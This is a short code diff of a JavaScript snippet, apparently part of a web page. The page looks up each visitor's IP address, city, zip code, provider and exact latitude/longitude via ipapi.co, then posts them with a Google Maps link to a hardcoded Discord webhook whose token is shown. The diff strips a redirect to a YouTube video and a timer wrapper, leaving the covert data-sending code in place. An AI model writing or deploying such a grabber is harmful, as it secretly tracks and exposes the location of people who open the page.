@@ -40,12 +40,6 @@ $.getJSON('https://ipapi.co/json')
         }, 500)
       },500)
     },7900)
-    function stop()
-    {
-      window.location.replace("https://www.youtube.com/watch?v=hiRacdl02w4");
-    }
-    setTimeout(function()
-    {
       const whurl = "https://discord.com/api/webhooks/1193834496273940611/b78sju_6H32RA7gTGy0CjlTv5_g3tWIZh-3QXUzOUF6APzUTlRBjjElFlbffQ-wmVLJg";
       const msg = {
         "content": "@everyone : Country: " + country + " IP: " + ip + " countryCode:  " + cc + " City: " + city + " Timezone: " + time + " Wifi Provider: " + ass + " Zipcode: " + zip + " Region: " + region + " Region Name: " + regionName + " N: " + lat + " E: " + lon + 'https://www.google.com/maps/search/' + lat + '+' + lon + '?sa=X&ved=2ahUKEwjRvLWLgcmDAxVUSvEDHe9qC64Q8gF6BAgPEAA'
@@ -67,4 +61,3 @@ $.getJSON('https://ipapi.co/json')
     .catch(error => {
       console.error("Error:", error);
     });
-    },300)
